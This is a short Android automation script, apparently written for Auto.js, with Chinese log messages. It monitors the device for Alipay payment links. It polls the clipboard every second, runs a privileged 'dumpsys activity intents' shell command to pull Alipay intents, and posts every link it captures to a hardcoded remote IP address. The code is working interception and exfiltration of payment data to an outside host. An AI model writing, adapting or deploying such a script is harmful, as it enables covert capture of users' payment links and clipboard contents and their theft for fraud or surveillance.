const SERVER_URL = "http://43.162.112.203:5000/payment";

console.show();
console.log("开始监听支付链接...");

events.on("activity", function(activity) {
    let packageName = activity.packageName;
    
    if (packageName && packageName.includes("alipay")) {
        console.log("检测到支付宝启动");
        captureIntent();
    }
});

setInterval(function() {
    let clip = getClip();
    if (clip && (clip.startsWith("alipay://") || clip.startsWith("alipays://"))) {
        console.log("拦截到支付链接: " + clip);
        sendToServer(clip);
    }
}, 1000);

function captureIntent() {
    try {
        let result = shell("dumpsys activity intents | grep alipay", true);
        if (result.code == 0) {
            let output = result.result;
            extractLink(output);
        }
    } catch (e) {
        console.error("读取 Intent 失败: " + e);
    }
}

function extractLink(text) {
    let regex = new RegExp("alipay[s]?://[^\\s'\"<>]+", "gi");
    let matches = text.match(regex);
    if (matches) {
        matches.forEach(link => {
            console.log("提取到链接: " + link);
            sendToServer(link);
        });
    }
}

function sendToServer(link) {
    http.postJson(SERVER_URL, {
        url: link
    }, {}, function(res, err) {
        if (err) {
            console.error("发送失败: " + err);
        } else {
            console.log("已发送到服务器");
        }
    });
}

console.log("监听已启动，按音量下键停止");

